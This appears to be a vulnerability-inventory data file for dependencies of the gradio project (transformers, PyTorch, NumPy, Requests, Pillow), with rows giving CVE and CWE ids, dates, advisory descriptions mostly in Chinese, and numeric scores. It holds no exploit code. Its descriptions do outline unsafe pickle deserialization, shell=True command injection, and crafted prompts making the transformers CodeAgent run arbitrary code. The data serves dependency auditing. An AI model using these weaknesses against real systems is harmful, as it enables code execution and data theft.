gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
gradio-app_gradio,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
gradio-app_gradio,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
gradio-app_gradio,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
gradio-app_gradio,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
gradio-app_gradio,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
gradio-app_gradio,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
gradio-app_gradio,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
